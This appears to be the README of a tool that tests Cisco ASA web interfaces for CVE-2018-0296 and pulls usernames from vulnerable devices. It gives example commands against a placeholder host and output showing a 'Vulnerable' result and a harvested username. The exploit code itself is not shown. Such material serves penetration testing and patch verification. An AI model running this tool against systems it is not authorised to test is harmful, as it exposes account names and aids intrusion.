# CVE-2018-0296
Test CVE-2018-0296 and extract usernames
  
Refer to https://sekurak.pl/opis-bledu-cve-2018-0296-ominiecie-uwierzytelnienia-w-webinterfejsie-cisco-asa/ for more technical details.  
  
```
$ ./CVE-2018-0296 -u https://x.x.x.x:443
[*] Checking: https://x.x.x.x:443
[+] https://x.x.x.x:443 [Vulnerable]
[*] Usernames found
testuser1
  
$ ./CVE-2018-0296  -i 127.0.0.1 -p 10000 --loop 10 -u https://x.x.x.x:443
[*] Checking: https://x.x.x.x:443
[+] https://x.x.x.x:443 [Vulnerable]
[*] Usernames found
testuser1
```
